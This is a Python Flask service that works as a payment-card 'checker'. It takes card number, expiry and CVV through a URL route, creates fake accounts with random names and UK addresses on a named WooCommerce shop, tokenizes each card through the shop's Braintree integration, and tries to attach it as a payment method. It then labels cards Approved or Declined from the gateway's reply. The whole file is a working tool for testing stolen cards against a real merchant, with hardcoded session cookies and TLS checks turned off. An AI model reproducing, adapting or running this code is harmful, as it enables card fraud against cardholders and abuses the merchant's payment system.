from flask import Flask, request, jsonify
import pyfiglet, webbrowser, user_agent, time
import requests, re, base64, random, string
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

app = Flask(__name__)

# Global session object
user = user_agent.generate_user_agent()
r = requests.session()
r.follow_redirects = True
r.verify = False

def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams"]
    full_name = random.choice(first_names) + " " + random.choice(last_names)
    first_name, last_name = full_name.split()
    return first_name, last_name

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool"]
    states = ["England", "England", "England", "England"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG"]
    city = random.choice(cities)
    state = states[cities.index(city)]
    street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
    zip_code = zip_codes[states.index(state)]
    return city, state, street_address, zip_code

def generate_random_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def username():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=20))
    return f"{name}{number}"

def num():
    number = ''.join(random.choices(string.digits, k=7))
    return f"303{number}"

def generate_random_code(length=32):
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for _ in range(length))

def process_card(cc_data):
    try:
        P = cc_data.strip()
        if not P:
            return {"cc": P, "response": "Invalid card format", "status": "Declined"}
            
        # Generate fresh account details for each card
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        username_val = username()
        num_val = num()
        corr = generate_random_code()
        sess = generate_random_code()

        # Parse card details
        n = P.split('|')[0]
        bin3 = n[:6]
        mm = P.split('|')[1]
        if int(mm) in [10, 11, 12]:
            mm = mm
        elif len(mm) == 1:
            mm = f'0{mm}'
        else:
            mm = mm
        yy = P.split('|')[2]
        cvc = P.split('|')[3].strip()
        if len(yy) == 2:
            yy = f'20{yy}'
        else:
            yy = yy

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'referer': 'https://www.bebebrands.com/wp-login.php?action=logout&redirect_to=https%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2F&_wpnonce=936b75e2b6',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = requests.get('https://www.bebebrands.com/my-account/', headers=headers)
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data = {
            'username': username_val,
            'email': acc,
            'password': 'Sa147258369Lah@#',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': 'https://www.bebebrands.com/my-account/edit-address/billing/',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': 'https://www.bebebrands.com/my-account/edit-address/',
            'wc_order_attribution_session_start_time': '2025-03-28 14:24:48',
            'wc_order_attribution_session_pages': '10',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        response = r.post('https://www.bebebrands.com/my-account/', headers=headers, data=data)

        cookies = {
            'flatsome_cookie_notice': '1',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_first_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'wordpress_logged_in_a69219699aff2e68eaf5b785dc26a5f8': 'modcathelost%7C1744381713%7C0j0aebEgeaAYJepl9dUwuOQKfheadarEuB475nDLp2z%7C7ebe9aa3acae575c4b0cc46a21136921f797d773db00ace7c1e92f2728fa7a51',
            'sbjs_session': 'pgs%3D14%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F',
        }

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'referer': 'https://www.bebebrands.com/my-account/edit-address/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = r.get('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=cookies, headers=headers)
        address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)

        cookies = {
            'flatsome_cookie_notice': '1',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_first_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'wordpress_logged_in_a69219699aff2e68eaf5b785dc26a5f8': 'modcathelost%7C1744381713%7C0j0aebEgeaAYJepl9dUwuOQKfheadarEuB475nDLp2z%7C7ebe9aa3acae575c4b0cc46a21136921f797d773db00ace7c1e92f2728fa7a51',
            'sbjs_session': 'pgs%3D15%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
        }

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/edit-address/billing/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
        }

        data = {
            'billing_first_name': first_name,
            'billing_last_name': last_name,
            'billing_company': '',
            'billing_country': 'GB',
            'billing_address_1': street_address,
            'billing_address_2': '',
            'billing_city': city,
            'billing_state': '',
            'billing_postcode': zip_code,
            'billing_phone': num_val,
            'billing_email': acc,
            'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address,
            '_wp_http_referer': '/my-account/edit-address/billing/',
            'action': 'edit_address',
        }

        response = r.post('https://www.bebebrands.com/my-account/edit-address/billing/', cookies=r.cookies, headers=headers, data=data)

        cookies = {
            'flatsome_cookie_notice': '1',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_first_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'wordpress_logged_in_a69219699aff2e68eaf5b785dc26a5f8': 'modcathelost%7C1744381713%7C0j0aebEgeaAYJepl9dUwuOQKfheadarEuB475nDLp2z%7C7ebe9aa3acae575c4b0cc46a21136921f797d773db00ace7c1e92f2728fa7a51',
            'sbjs_session': 'pgs%3D17%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fpayment-methods%2F',
        }

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'referer': 'https://www.bebebrands.com/my-account/payment-methods/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        response = r.get('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
        add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)

        cookies = {
            'wordpress_sec_a69219699aff2e68eaf5b785dc26a5f8': 'modcathelost%7C1744381713%7C0j0aebEgeaAYJepl9dUwuOQKfheadarEuB475nDLp2z%7C87bbc2764a719a9133604dcfa4326277cb7cc19fc587b1fb2b7345868303ded9',
            'flatsome_cookie_notice': '1',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_first_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'wordpress_logged_in_a69219699aff2e68eaf5b785dc26a5f8': 'modcathelost%7C1744381713%7C0j0aebEgeaAYJepl9dUwuOQKfheadarEuB475nDLp2z%7C7ebe9aa3acae575c4b0cc46a21136921f797d773db00ace7c1e92f2728fa7a51',
            'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fadd-payment-method%2F',
        }

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client,
        }

        response = r.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
        enc = response.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]

        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user,
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'a6431654-b18e-4ee5-b5df-248ff3a293fd',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        if not tok:
            return {"cc": f"{n}|{mm}|{yy}|{cvc}", "response": "Failed to extract token", "status": "Declined"}

        cookies = {
            'flatsome_cookie_notice': '1',
            'sbjs_migrations': '1418474375998%3D1',
            'sbjs_current_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_first_add': 'fd%3D2025-03-28%2014%3A24%3A48%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fedit-address%2Fbilling%2F',
            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36',
            'wordpress_test_cookie': 'WP%20Cookie%20check',
            'wordpress_logged_in_a69219699aff2e68eaf5b785dc26a5f8': 'modcathelost%7C1744381713%7C0j0aebEgeaAYJepl9dUwuOQKfheadarEuB475nDLp2z%7C7ebe9aa3acae575c4b0cc46a21136921f797d773db00ace7c1e92f2728fa7a51',
            'sbjs_session': 'pgs%3D18%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.bebebrands.com%2Fmy-account%2Fadd-payment-method%2F',
        }

        headers = {
            'authority': 'www.bebebrands.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7,fr-FR;q=0.6,fr;q=0.5',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.bebebrands.com',
            'referer': 'https://www.bebebrands.com/my-account/add-payment-method/',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': user,
        }

        data = [
            ('payment_method', 'braintree_credit_card'),
            ('wc-braintree-credit-card-card-type', 'master-card'),
            ('wc-braintree-credit-card-3d-secure-enabled', ''),
            ('wc-braintree-credit-card-3d-secure-verified', ''),
            ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
            ('wc_braintree_credit_card_payment_nonce', tok),
            ('wc_braintree_device_data', '{"correlation_id":"28b5d5b50afc7b55d31519b3cbeea91c"}'),
            ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
            ('wc_braintree_paypal_payment_nonce', ''),
            ('wc_braintree_device_data', '{"correlation_id":"28b5d5b50afc7b55d31519b3cbeea91c"}'),
            ('wc-braintree-paypal-context', 'shortcode'),
            ('wc_braintree_paypal_amount', '0.00'),
            ('wc_braintree_paypal_currency', 'GBP'),
            ('wc_braintree_paypal_locale', 'en_gb'),
            ('wc-braintree-paypal-tokenize-payment-method', 'true'),
            ('woocommerce-add-payment-method-nonce', add_nonce),
            ('_wp_http_referer', '/my-account/add-payment-method/'),
            ('woocommerce_add_payment_method', '1'),
        ]

        response = r.post('https://www.bebebrands.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)

        text = response.text
        pattern = r'Status code (.*?)\s*</li>'
        match = re.search(pattern, text)
        if match:
            result = match.group(1)
            if 'risk_threshold' in text:
                result = "RISK: try this BIN later."
        else:
            if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
                result = "1000: Approved"
            else:
                result = "Error"

        if 'funds' in result or 'Card Issuer Declined CVV' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
            return {"cc": f"{n}|{mm}|{yy}|{cvc}", "response": result, "status": "Approved"}
        else:
            return {"cc": f"{n}|{mm}|{yy}|{cvc}", "response": result, "status": "Declined"}
            
    except Exception as e:
        return {"cc": P, "response": str(e), "status": "Error"}

@app.route('/gate=b4/key=darkwaslost/cc=<cc_data>')
def check_cc(cc_data):
    result = process_card(cc_data)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
